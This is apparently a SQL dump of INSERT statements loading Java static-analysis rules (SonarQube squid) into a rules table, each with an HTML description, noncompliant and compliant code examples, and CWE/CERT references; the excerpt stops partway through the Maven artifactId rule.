INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1003, 'The signature of "finalize()" should match that of "Object.finalize()"', 'S1175', NULL, 'squid', '<p><code>Object.finalize()</code> is called by the Garbage Collector at some point after the object becomes unreferenced.</p>
<p>In general, overloading <code>Object.finalize()</code> is a bad idea because:</p>
<ul>
  <li> The overload may not be called by the Garbage Collector. </li>
  <li> Users are not expected to call <code>Object.finalize()</code> and will get confused. </li>
</ul>
<p>But beyond that it''s a terrible idea to name a method "finalize" if it doesn''t actually override <code>Object.finalize()</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int finalize(int someParameter) {        // Noncompliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int someBetterName(int someParameter) {  // Compliant
  /* ... */
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813059, 1510817813059, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1004, 'Mutable members should not be stored or returned directly', 'S2384', NULL, 'squid', '<p>Mutable objects are those whose state can be changed. For instance, an array is mutable, but a String is not. Mutable class members should never be
returned to a caller or accepted and stored directly. Doing so leaves you vulnerable to unexpected changes in your class state.</p>
<p>Instead use an unmodifiable <code>Collection</code> (via <code>Collections.unmodifiableCollection</code>,
<code>Collections.unmodifiableList</code>, ...) or make a copy of the mutable object, and store or return the copy instead.</p>
<p>This rule checks that arrays, collections and Dates are not stored or returned directly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  private String [] strings;

  public A () {
    strings = new String[]{"first", "second"};
  }

  public String [] getStrings() {
    return strings; // Noncompliant
  }

  public void setStrings(String [] strings) {
    this.strings = strings;  // Noncompliant
  }
}

public class B {

  private A a = new A();  // At this point a.strings = {"first", "second"};

  public void wreakHavoc() {
    a.getStrings()[0] = "yellow";  // a.strings = {"yellow", "second"};
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private String [] strings;

  public A () {
    strings = new String[]{"first", "second"};
  }

  public String [] getStrings() {
    return strings.clone();
  }

  public void setStrings(String [] strings) {
    this.strings = strings.clone();
  }
}

public class B {

  private A a = new A();  // At this point a.strings = {"first", "second"};

  public void wreakHavoc() {
    a.getStrings()[0] = "yellow";  // a.strings = {"first", "second"};
  }
}

</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/374">MITRE, CWE-374</a> - Passing Mutable Objects to an Untrusted Method </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/375">MITRE, CWE-375</a> - Returning a Mutable Object to an Untrusted Caller </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zQCuAQ">CERT, OBJ05-J.</a> - Do not return references to private mutable class members
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QIEVAQ">CERT, OBJ06-J.</a> - Defensively copy mutable inputs and mutable internal
  components </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/JQLEAw">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/kwCuAQ">CERT, OOP08-CPP.</a> - Do not return references to private data </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,unpredictable', false, 'HTML', 1510817813060, 1510817813060, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1046, 'Group ids should follow a naming convention', 'S3419', NULL, 'squid', '<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when the a pom''s <code>groupId</code> does not match
the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>(com|org)(\.[a-z][a-z-0-9]*)+</code></p>
<pre>
&lt;project ...&gt;
  &lt;groupId&gt;myCo&lt;/groupId&gt;  &lt;!-- Noncompliant --&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;project ...&gt;
  &lt;groupId&gt;com.myco&lt;/groupId&gt;

  &lt;!-- ... --&gt;
&lt;/project&gt;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention,maven', false, 'HTML', 1510817813132, 1510817813132, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1005, '"InterruptedException" should not be ignored', 'S2142', NULL, 'squid', '<p><code>InterruptedExceptions</code> should never be ignored in the code, and simply logging the exception counts in this case as "ignoring". The
throwing of the <code>InterruptedException</code> clears the interrupted state of the Thread, so if the exception is not handled properly the fact
that the thread was interrupted will be lost. Instead, <code>InterruptedExceptions</code> should either be rethrown - immediately or after cleaning up
the method''s state - or the thread should be re-interrupted by calling <code>Thread.interrupt()</code> even if this is supposed to be a
single-threaded application. Any other course of action risks delaying thread shutdown and loses the information that the thread was interrupted -
probably without finishing its task.</p>
<p>Similarly, the <code>ThreadDeath</code> exception should also be propagated. According to its JavaDoc:</p>
<blockquote>
  <p>If <code>ThreadDeath</code> is caught by a method, it is important that it be rethrown so that the thread actually dies.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) { // Noncompliant; logging is not enough
    LOGGER.log(Level.WARN, "Interrupted!", e);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) {
    LOGGER.log(Level.WARN, "Interrupted!", e);
    // Restore interrupted state...
    Thread.currentThread().interrupt();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/391.html">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> <a href="https://www.ibm.com/developerworks/java/library/j-jtp05236/index.html?ca=drs-#2.1">Dealing with InterruptedException</a> </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cwe,multi-threading', false, 'HTML', 1510817813061, 1510817813062, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1006, 'Child class fields should not shadow parent class fields', 'S2387', NULL, 'squid', '<p>Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy and you''ll get confusion at
best, chaos at worst. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry extends Fruit {
  private boolean ripe;  // Noncompliant
  private static Color FLESH; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry extends Fruit {
  private boolean ripened;
  private static Color FLESH_COLOR;

}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores same-name fields that are <code>static</code> in both the parent and child classes. This rule ignores <code>private</code> parent
class fields, but in all other such cases, the child class field should be renamed.</p>
<pre>
public class Fruit {
  private Season ripe;
  // ...
}

public class Raspberry extends Fruit {
  private Season ripe;  // Compliant as parent field ''ripe'' is anyway not visible from Raspberry
  // ...
}
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing', false, 'HTML', 1510817813063, 1510817813063, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1007, 'Defined filters should be used', 'S3355', NULL, 'squid', '<p>Every filter defined in <code>web.xml</code> file should be used in a <code>&lt;filter-mapping&gt;</code> element. Otherwise such filters are not
invoked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  &lt;filter&gt;
     &lt;filter-name&gt;DefinedNotUsed&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
  &lt;filter&gt;
     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;
  &lt;/filter&gt;

  &lt;filter-mapping&gt;
     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;
     &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
  &lt;/filter-mapping&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top Ten 2013 Category A1</a> - Injection </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'injection,owasp-a1', false, 'HTML', 1510817813064, 1510817813064, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1008, 'Mutable fields should not be "public static"', 'S2386', NULL, 'squid', '<p>There is no good reason to have a mutable object as the <code>public</code> (by default), <code>static</code> member of an <code>interface</code>.
Such variables should be moved into classes and their visibility lowered. </p>
<p>Similarly, mutable <code>static</code> members of classes and enumerations which are accessed directly, rather than through getters and setters,
should be protected to the degree possible. That can be done by reducing visibility or making the field <code>final</code> if appropriate. </p>
<p>Note that making a mutable field, such as an array, <code>final</code> will keep the variable from being reassigned, but doing so has no effect on
the mutability of the internal state of the array (i.e. it doesn''t accomplish the goal).</p>
<p>This rule raises issues for <code>public static</code> array, <code>Collection</code>, <code>Date</code>, and <code>awt.Point</code> members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface MyInterface {
  public static String [] strings; // Noncompliant
}

public class A {
  public static String [] strings1 = {"first","second"};  // Noncompliant
  public static String [] strings2 = {"first","second"};  // Noncompliant
  public static List&lt;String&gt; strings3 = new ArrayList&lt;&gt;();  // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/582.html">MITRE, CWE-582</a> - Array Declared Public, Final, and Static </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/607.html">MITRE, CWE-607</a> - Public Static Final Field References Mutable Object </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/rwBc">CERT, OBJ01-J.</a> - Limit accessibility of fields </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/JQLEAw">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed
  </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe,unpredictable', false, 'HTML', 1510817813065, 1510817813065, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1009, 'Catches should be combined', 'S2147', NULL, 'squid', '<p>Since Java 7 it has been possible to catch multiple exceptions at once. Therefore, when multiple <code>catch</code> blocks have the same code, they
should be combined for better readability.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
catch (IOException e) {
  doCleanup();
  logger.log(e);
}
catch (SQLException e) {  // Noncompliant
  doCleanup();
  logger.log(e);
}
catch (TimeoutException e) {  // Compliant; block contents are different
  doCleanup();
  throw e;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
catch (IOException|SQLException e) {
  doCleanup();
  logger.log(e);
}
catch (TimeoutException e) {
  doCleanup();
  throw e;
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813066, 1510817813066, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1010, 'Double Brace Initialization should not be used', 'S3599', NULL, 'squid', '<p>Because Double Brace Initialization (DBI) creates an anonymous class with a reference to the instance of the owning object, its use can lead to
memory leaks if the anonymous inner class is returned and held by other objects. Even when there''s no leak, DBI is so obscure that it''s bound to
confuse most maintainers. </p>
<p>For collections, use <code>Arrays.asList</code> instead, or explicitly add each item directly to the collection.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Map source = new HashMap(){{ // Noncompliant
    put("firstName", "John");
    put("lastName", "Smith");
}};
</pre>
<h2>Compliant Solution</h2>
<pre>
Map source = new HashMap();
// ...
source.put("firstName", "John");
source.put("lastName", "Smith");
// ...
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'leak', false, 'HTML', 1510817813067, 1510817813067, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1011, 'Inner class calls to super class methods should be unambiguous', 'S2388', NULL, 'squid', '<p>When an inner class extends another class, and both its outer class and its parent class have a method with the same name, calls to that method can
be confusing. The compiler will resolve the call to the superclass method, but maintainers may be confused, so the superclass method should be called
explicitly, using <code>super.</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {
  public void foo() { ... }
}

public class Outer {

  public void foo() { ... }

  public class Inner extends Parent {

    public void doTheThing() {
      foo();  // Noncompliant; was Outer.this.foo() intended instead?
      // ...
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Parent {
  public void foo() { ... }
}

public class Outer {

  public void foo() { ... }

  public class Inner extends Parent {

    public void doTheThing() {
      super.foo();
      // ...
    }
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813068, 1510817813068, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1012, 'Underscores should be used to make large numbers readable', 'S2148', NULL, 'squid', '<p>Beginning with Java 7, it is possible to add underscores (''_'') to numeric literals to enhance readability. The addition of underscores in this
manner has no semantic meaning, but makes it easier for maintainers to understand the code.</p>
<p>The number of digits to the left of a decimal point needed to trigger this rule varies by base.</p>
<table>
  <tbody>
    <tr>
      <th>Base</th>
      <th> Minimum digits</th>
    </tr>
    <tr>
      <td>binary</td>
      <td> 9 </td>
    </tr>
    <tr>
      <td>octal</td>
      <td> 9 </td>
    </tr>
    <tr>
      <td>decimal</td>
      <td> 6 </td>
    </tr>
    <tr>
      <td>hexadecimal</td>
      <td> 9 </td>
    </tr>
  </tbody>
</table>
<p>It is only the presence of underscores, not their spacing that is scrutinized by this rule.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 10000000;  // Noncompliant; is this 10 million or 100 million?
int  j = 0b01101001010011011110010101011110;  // Noncompliant
long l = 0x7fffffffffffffffL;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int i = 10_000_000;
int  j = 0b01101001_01001101_11100101_01011110;
long l = 0x7fff_ffff_ffff_ffffL;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817813069, 1510817813069, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1013, 'Ternary operators should not be nested', 'S3358', NULL, 'squid', '<p>Just because you <em>can</em> do something, doesn''t mean you should, and that''s the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String getTitle(Person p) {

  return p.gender==Person.MALE?"Mr. ":p.isMarried()?"Mrs. ":"Miss " + p.getLastName();  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>

  String honorific = p.isMarried()?"Mrs. ":"Miss ";
  return p.gender==Person.MALE?"Mr. ": honorific + p.getLastName();
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing', false, 'HTML', 1510817813070, 1510817813070, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1015, 'Constructor injection should be used instead of field injection', 'S3306', NULL, 'squid', '<p>Field injection seems like a tidy way to get your classes what they need to do their jobs, but it''s really a <code>NullPointerException</code>
waiting to happen unless all your class constructors are <code>private</code>. That''s because any class instances that are constructed by callers,
rather than instantiated by the Spring framework, won''t have the ability to perform the field injection.</p>
<p>Instead <code>@Inject</code> should be moved to the constructor and the fields required as constructor parameters.</p>
<p>This rule raises an issue when classes with non-<code>private</code> constructors (including the default constructor) use field injection.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyComponent {  // Anyone can call the default constructor

  @Inject MyCollaborator collaborator;  // Noncompliant

  public void myBusinessMethod() {
    collaborator.doSomething();  // this will fail in classes new-ed by a caller
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyComponent {

  private final MyCollaborator collaborator;

  @Inject
  public MyComponent(MyCollaborator collaborator) {
    Assert.notNull(collaborator, "MyCollaborator must not be null!");
    this.collaborator = collaborator;
  }

  public void myBusinessMethod() {
    collaborator.doSomething();
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'design,pitfall', false, 'HTML', 1510817813072, 1510817813072, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1016, 'Threads should not be started in constructors', 'S2693', NULL, 'squid', '<p>The problem with invoking <code>Thread.start()</code> in a constructor is that you''ll have a confusing mess on your hands if the class is ever
extended because the superclass'' constructor will start the thread before the child class has truly been initialized.</p>
<p>This rule raises an issue any time <code>start</code> is invoked in the constructor of a non-<code>final</code> class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  Thread thread = null;

  public MyClass(Runnable runnable) {
    thread = new Thread(runnable);
    thread.start(); // Noncompliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZQIRAg">CERT, TSM02-J.</a> - Do not use background threads during class initialization
  </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert,multi-threading,pitfall', false, 'HTML', 1510817813073, 1510817813073, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1017, '"indexOf" checks should not be for positive numbers', 'S2692', NULL, 'squid', '<p>Most checks against an <code>indexOf</code> value compare it with -1 because 0 is a valid index. Any checks which look for values &gt;0 ignore the
first element, which is likely a bug. If the intent is merely to check inclusion of a value in a <code>String</code> or a <code>List</code>, consider
using the <code>contains</code> method instead.</p>
<p>This rule raises an issue when an <code>indexOf</code> value retrieved either from a <code>String</code> or a <code>List</code> is tested against
<code>&gt;0</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String color = "blue";
String name = "ishmael";

List&lt;String&gt; strings = new ArrayList&lt;String&gt; ();
strings.add(color);
strings.add(name);

if (strings.indexOf(color) &gt; 0) {  // Noncompliant
  // ...
}
if (name.indexOf("ish") &gt; 0) { // Noncompliant
  // ...
}
if (name.indexOf("ae") &gt; 0) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
String color = "blue";
String name = "ishmael";

List&lt;String&gt; strings = new ArrayList&lt;String&gt; ();
strings.add(color);
strings.add(name);

if (strings.indexOf(color) &gt; -1) {
  // ...
}
if (name.indexOf("ish") &gt;= 0) {
  // ...
}
if (name.contains("ae") {
  // ...
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'suspicious', false, 'HTML', 1510817813074, 1510817813074, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1019, '"PreparedStatement" and "ResultSet" methods should be called with valid indices', 'S2695', NULL, 'squid', '<p>The parameters in a <code>PreparedStatement</code> are numbered from 1, not 0, so using any "set" method of a <code>PreparedStatement</code> with a
number less than 1 is a bug, as is using an index higher than the number of parameters. Similarly, <code>ResultSet</code> indices also start at 1,
rather than 0</p>
<h2>Noncompliant Code Example</h2>
<pre>
PreparedStatement ps = con.prepareStatement("SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?");
ps.setDate(0, date);  // Noncompliant
ps.setDouble(3, salary);  // Noncompliant

ResultSet rs = ps.executeQuery();
while (rs.next()) {
  String fname = rs.getString(0);  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
PreparedStatement ps = con.prepareStatement("SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?");
ps.setDate(1, date);
ps.setDouble(2, salary);

ResultSet rs = ps.executeQuery();
while (rs.next()) {
  String fname = rs.getString(1);
  // ...
}
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'sql', false, 'HTML', 1510817813076, 1510817813076, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1020, 'Deprecated "${pom}" properties should not be used', 'S3421', NULL, 'squid', '<p>Deprecated features are those that have been retained temporarily for backward compatibility, but which will eventually be removed. In effect,
deprecation announces a grace period to allow the smooth transition from the old features to the new ones. In that period, no use of the deprecated
features should be added, and all existing uses should be gradually removed.</p>
<p>This rule raises an issue when <code>${pom.*}</code> properties are used in a pom.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  &lt;build&gt;
    &lt;finalName&gt;${pom.artifactId}-${pom.version}&lt;/finalName&gt;  &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
  &lt;build&gt;
    &lt;finalName&gt;${project.artifactId}-${project.version}&lt;/finalName&gt;
</pre>
<p>or</p>
<pre>
  &lt;build&gt;
    &lt;finalName&gt;${artifactId}-${version}&lt;/finalName&gt;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'maven,obsolete', false, 'HTML', 1510817813077, 1510817813077, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1021, 'Inner classes which do not reference their owning classes should be "static"', 'S2694', NULL, 'squid', '<p>A non-static inner class has a reference to its outer class, and access to the outer class'' fields and methods. That class reference makes the
inner class larger and could cause the outer class instance to live in memory longer than necessary. </p>
<p>If the reference to the outer class isn''t used, it is more efficient to make the inner class <code>static</code> (also called nested). If the
reference is used only in the class constructor, then explicitly pass a class reference to the constructor. If the inner class is anonymous, it will
also be necessary to name it. </p>
<p>However, while a nested/<code>static</code> class would be more efficient, it''s worth nothing that there are semantic differences between an inner
class and a nested one:</p>
<ul>
  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>
  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  // ...

  public class Seed {  // Noncompliant; there''s no use of the outer class reference so make it static
    int germinationDays = 0;
    public Seed(int germinationDays) {
      this.germinationDays = germinationDays;
    }
    public int getGerminationDays() {
      return germinationDays;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  // ...

  public static class Seed {
    int germinationDays = 0;
    public Seed(int germinationDays) {
      this.germinationDays = germinationDays;
    }
    public int getGerminationDays() {
      return germinationDays;
    }
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'performance', false, 'HTML', 1510817813078, 1510817813078, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1022, 'Artifact ids should follow a naming convention', 'S3420', NULL, 'squid', '<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a pom''s <code>artifactId</code> does not match the
provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>[a-z][a-z-0-9]+</code></p>
<pre>
&lt;project ...&gt;
  &lt;artifactId&gt;My_Project&lt;/artifactId&gt;  &lt;!-- Noncompliant --&gt;

